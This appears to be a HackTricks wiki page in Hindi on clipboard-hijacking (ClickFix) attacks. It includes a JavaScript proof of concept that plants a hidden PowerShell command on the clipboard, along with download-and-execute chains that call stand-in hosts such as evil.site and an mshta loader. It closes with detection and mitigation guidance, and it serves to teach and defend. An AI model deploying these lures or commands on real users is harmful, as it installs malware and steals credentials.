# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "आप कभी भी कुछ ऐसा न पेस्ट करें जो आपने खुद कॉपी नहीं किया।" – पुरानी लेकिन अभी भी मान्य सलाह

## Overview

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता नियमित रूप से कमांड को कॉपी और पेस्ट करते हैं बिना उन्हें जांचे। एक दुर्भावनापूर्ण वेब पृष्ठ (या किसी भी JavaScript-सक्षम संदर्भ जैसे कि एक Electron या Desktop एप्लिकेशन) प्रोग्रामेटिक रूप से हमलावर-नियंत्रित पाठ को सिस्टम क्लिपबोर्ड में रखता है। पीड़ितों को, सामान्यतः सावधानीपूर्वक तैयार किए गए सोशल-इंजीनियरिंग निर्देशों द्वारा, **Win + R** (Run संवाद), **Win + X** (Quick Access / PowerShell) दबाने या एक टर्मिनल खोलने और क्लिपबोर्ड सामग्री को *पेस्ट* करने के लिए प्रोत्साहित किया जाता है, जिससे तुरंत मनमाने कमांड निष्पादित होते हैं।

क्योंकि **कोई फ़ाइल डाउनलोड नहीं की जाती और कोई अटैचमेंट नहीं खोला जाता**, यह तकनीक अधिकांश ई-मेल और वेब-सामग्री सुरक्षा नियंत्रणों को बायपास करती है जो अटैचमेंट, मैक्रोज़ या सीधे कमांड निष्पादन की निगरानी करती हैं। इसलिए यह हमला फ़िशिंग अभियानों में लोकप्रिय है जो NetSupport RAT, Latrodectus लोडर या Lumma Stealer जैसे कमोडिटी मैलवेयर परिवारों को वितरित करते हैं।

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुराने अभियानों ने `document.execCommand('copy')` का उपयोग किया, जबकि नए अभियानों में असिंक्रोनस **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भरता होती है।

## ClickFix / ClearFake प्रवाह

1. उपयोगकर्ता एक टाइपोसक्वाटेड या समझौता किए गए साइट पर जाता है (जैसे `docusign.sa[.]com`)
2. इंजेक्टेड **ClearFake** जावास्क्रिप्ट एक `unsecuredCopyToClipboard()` सहायक को कॉल करता है जो चुपचाप एक Base64-कोडित PowerShell एक-लाइनर को क्लिपबोर्ड में स्टोर करता है।
3. HTML निर्देश पीड़ित को बताते हैं: *“**Win + R** दबाएं, कमांड पेस्ट करें और समस्या को हल करने के लिए Enter दबाएं।”*
4. `powershell.exe` निष्पादित होता है, एक आर्काइव डाउनलोड करता है जिसमें एक वैध निष्पादन योग्य और एक दुर्भावनापूर्ण DLL (क्लासिक DLL साइडलोडिंग) होता है।
5. लोडर अतिरिक्त चरणों को डिक्रिप्ट करता है, शेलकोड इंजेक्ट करता है और स्थिरता स्थापित करता है (जैसे शेड्यूल किया गया कार्य) – अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।

### उदाहरण NetSupport RAT श्रृंखला
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (वैध Java WebStart) अपने निर्देशिका में `msvcp140.dll` की खोज करता है।
* दुर्भावनापूर्ण DLL **GetProcAddress** के साथ APIs को गतिशील रूप से हल करता है, **curl.exe** के माध्यम से दो बाइनरी (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, उन्हें एक रोलिंग XOR कुंजी `"https://google.com/"` का उपयोग करके डिक्रिप्ट करता है, अंतिम शेलकोड को इंजेक्ट करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में अनजिप करता है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript डाउनलोडर को निष्पादित करता है
3. एक MSI पेलोड लाता है → एक साइन किए गए एप्लिकेशन के बगल में `libcef.dll` छोड़ता है → DLL साइडलोडिंग → शेलकोड → Latrodectus।

### MSHTA के माध्यम से Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** कॉल एक छिपा हुआ PowerShell स्क्रिप्ट लॉन्च करता है जो `PartyContinued.exe` को प्राप्त करता है, `Boat.pst` (CAB) को निकालता है, `extrac32` और फ़ाइल संयोजन के माध्यम से `AutoIt3.exe` को पुनर्निर्माण करता है और अंततः एक `.a3x` स्क्रिप्ट चलाता है जो ब्राउज़र क्रेडेंशियल्स को `sumeriavgv.digital` पर एक्सफिल्ट्रेट करता है।

## Detection & Hunting

ब्लू-टीम क्लिपबोर्ड, प्रक्रिया-निर्माण और रजिस्ट्री टेलीमेट्री को मिलाकर पेस्टजैकिंग दुरुपयोग को पहचान सकती है:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** कमांड का एक इतिहास रखता है - असामान्य Base64 / ओबफस्केटेड प्रविष्टियों की तलाश करें।
* सुरक्षा इवेंट ID **4688** (प्रक्रिया निर्माण) जहां `ParentImage` == `explorer.exe` और `NewProcessName` में { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
* इवेंट ID **4663** फ़ाइल निर्माण के लिए `%LocalAppData%\Microsoft\Windows\WinX\` या असामान्य 4688 इवेंट से ठीक पहले अस्थायी फ़ोल्डरों के तहत।
* EDR क्लिपबोर्ड सेंसर (यदि मौजूद हैं) - `Clipboard Write` के तुरंत बाद एक नए PowerShell प्रक्रिया का सहसंबंध करें।

## Mitigations

1. ब्राउज़र हार्डनिंग - क्लिपबोर्ड लिखने की पहुंच को अक्षम करें (`dom.events.asyncClipboard.clipboardItem` आदि) या उपयोगकर्ता इशारा की आवश्यकता करें।
2. सुरक्षा जागरूकता - उपयोगकर्ताओं को संवेदनशील कमांड *टाइप* करने या पहले उन्हें टेक्स्ट संपादक में पेस्ट करने के लिए सिखाएं।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control को मनमाने एक-लाइनर्स को ब्लॉक करने के लिए।
4. नेटवर्क नियंत्रण - ज्ञात पेस्टजैकिंग और मैलवेयर C2 डोमेन के लिए आउटबाउंड अनुरोधों को ब्लॉक करें।

## Related Tricks

* **Discord Invite Hijacking** अक्सर एक दुर्भावनापूर्ण सर्वर में उपयोगकर्ताओं को लुभाने के बाद उसी ClickFix दृष्टिकोण का दुरुपयोग करता है:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
